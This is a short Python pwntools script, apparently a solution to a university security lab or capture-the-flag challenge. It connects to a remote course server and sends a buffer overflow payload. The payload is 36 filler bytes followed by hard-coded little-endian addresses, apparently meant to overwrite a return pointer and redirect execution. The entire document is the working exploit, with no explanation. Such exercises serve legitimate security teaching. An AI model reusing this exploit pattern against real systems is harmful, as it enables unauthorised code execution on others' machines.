from pwn import *
import time

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22155

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'x' * 36 + b'\x01\xa0\x04\x08' + b'x' * 4 + b'\xd9\x87\x04\x08')
time.sleep(1)
print(s.recv(512).decode())